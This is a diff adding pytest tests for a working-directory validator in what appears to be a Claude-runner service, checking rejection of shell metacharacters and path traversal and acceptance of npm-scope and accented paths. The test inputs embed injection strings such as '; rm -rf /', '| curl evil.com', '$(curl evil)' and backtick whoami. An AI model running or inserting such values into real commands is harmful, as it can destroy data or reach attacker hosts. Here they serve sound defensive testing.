@@ -325,3 +325,60 @@ class TestValidateWorkingDir:
         # the directory check, NOT the allowlist check.
         with pytest.raises(ValueError, match="does not exist"):
             _validate_working_dir("/opt/myapp/workspace")
+
+    @pytest.mark.parametrize(
+        "shell_meta_path",
+        [
+            "/tmp/repo; rm -rf /",
+            "/tmp/repo | curl evil.com",
+            "/tmp/repo$(curl evil)",
+            "/tmp/repo`whoami`",
+            "/tmp/repo\nrm",
+            "/tmp/repo & background",
+            "/tmp/repo(forked)",
+            "/tmp/repo,backup",
+            "/tmp/O'Reilly",
+        ],
+    )
+    def test_suffix_with_shell_meta_rejected(self, shell_meta_path: str) -> None:
+        """The SAFE_SUFFIX regex must reject shell metacharacters.
+
+        These paths satisfy the prefix allowlist (``/tmp/``) but contain
+        characters that could later flow into a shell context. Reject
+        them at the structural layer.
+        """
+        from app.services.claude_runner import _validate_working_dir
+
+        with pytest.raises(ValueError, match="disallowed characters"):
+            _validate_working_dir(shell_meta_path)
+
+    def test_suffix_path_traversal_rejected(self) -> None:
+        """A ``..`` segment in the suffix must be rejected explicitly.
+
+        ``..`` is allowed by the character class (``.`` is a legit file
+        character) so a dedicated check rejects the traversal segment.
+        """
+        from app.services.claude_runner import _validate_working_dir
+
+        with pytest.raises(ValueError, match="path-traversal"):
+            _validate_working_dir("/tmp/repo/../etc")
+
+    def test_suffix_accepts_npm_scope_and_accented(self, tmp_path: object) -> None:
+        """Paths with ``@`` (npm scopes) and accented chars must pass.
+
+        Real-world repo paths legitimately include these characters; an
+        over-strict regex breaks scoped-monorepo or non-ASCII home dirs.
+        """
+        from pathlib import Path as _Path
+
+        from app.services.claude_runner import _validate_working_dir
+
+        scoped = _Path(tmp_path) / "@scope" / "pkg"  # type: ignore[operator]
+        scoped.mkdir(parents=True)
+        result = _validate_working_dir(str(scoped))
+        assert result.endswith("@scope/pkg")
+
+        accented = _Path(tmp_path) / "José" / "repo"  # type: ignore[operator]
+        accented.mkdir(parents=True)
+        result = _validate_working_dir(str(accented))
+        assert "José" in result
